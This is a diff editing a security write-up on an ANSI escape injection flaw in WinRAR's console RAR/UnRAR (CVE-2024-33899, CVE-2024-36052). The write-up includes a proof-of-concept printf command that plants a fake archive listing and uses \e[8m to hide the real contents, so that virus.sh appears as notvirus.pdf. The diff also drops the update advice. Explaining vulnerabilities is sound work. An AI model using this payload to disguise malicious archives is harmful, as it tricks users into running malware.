@@ -8,11 +8,11 @@ On February 28, 2024, RARLAB released an update for WinRAR, addressing an ANSI e
 
 ### ANSI Escape Sequences
 
-If you are familiar with the Linux, Unix, or Windows command line, you’ve likely encountered programs like Vim and Neofetch. These programs utilize ANSI escape sequences to modify text and background color, control the cursor, and create graphical user interfaces within the terminal. Although ANSI escape sequences can create advanced terminal programs, they can also be weaponized, as demonstrated in Stok Fredrik’s DEFCON talk.
+Programs like Vim and Neofetch utilize ANSI escape sequences to modify text and background color, control the cursor, and create graphical user interfaces within the terminal. Although ANSI escape sequences can create advanced terminal programs, they can also be weaponized.
 
 ### How WinRAR is Affected
 
-WinRAR provides console versions of RAR and UnRAR, which can be used to create and extract RAR archives. RAR files support comments, which are displayed when listing the contents of the archive using the command `unrar l demo.rar`.
+WinRAR provides console versions of RAR and UnRAR, which can be used to create and extract RAR archives. RAR files support comments, which are displayed when listing the contents of the archive using the command `rar l demo.rar`.
 
 #### Vulnerability Demonstration
 
@@ -31,8 +31,8 @@ First, we will place our virus.exe file inside a RAR archive:
 
 ```bash
 $ ls 
-virus.exe
-$ rar a demo.rar virus.exe
+virus.sh
+$ rar a demo.rar virus.sh
 ```
 
 Next, we will add the following payload to the comment section:
@@ -40,11 +40,11 @@ Next, we will add the following payload to the comment section:
 printf 'Archive: demo.rar\nDetails: RAR 5\n\nAttributes      Size       Date   Time   Name\n----------- ---------  ---------- -----  ---------\n-rw-r--r--          7  2024-05-19 16:26  notvirus.pdf\n----------- ---------  ---------- -----  ---------\n                    7                    1\e[8m' | rar c demo.rar
 ```
 
-This payload includes a fake listing where virus.exe is replaced with notvirus.pdf. The ANSI escape sequence \e[8m is used to hide all content after the comment section in the output. Consequently, the actual file listing is hidden, and our fake file listing is displayed.
+This payload includes a fake listing where virus.sh is replaced with notvirus.pdf. The ANSI escape sequence \e[8m is used to hide all content after the comment section in the output. Consequently, the actual file listing is hidden, and our fake file listing is displayed.
 
 ## Result
 In the screenshot above, you can see a large gap between the output and the shell prompt. This gap is due to the original file listing being outputted but rendered invisible using \e[8m. While experienced command line users may find this suspicious, less experienced users could easily be tricked.
 
 
 ## Conclusion
-The ANSI escape sequence injection vulnerability in the console versions of RAR and UnRAR posed a significant risk, allowing attackers to spoof output and potentially cause denial of service. This issue, identified as CVE-2024-33899 for Linux and Unix systems and CVE-2024-36052 for Windows, was addressed in WinRAR version 7.00. Users are strongly encouraged to update to the latest version to protect against this vulnerability. The GUI version of WinRAR and the UnRAR library remain unaffected by this issue.
+The ANSI escape sequence injection vulnerability in the console versions of RAR and UnRAR posed a significant risk, allowing attackers to spoof output and potentially cause denial of service. This issue, identified as CVE-2024-33899 for Linux and Unix systems and CVE-2024-36052 for Windows, was addressed in WinRAR version 7.00. The GUI version of WinRAR and the UnRAR library remain unaffected by this issue.
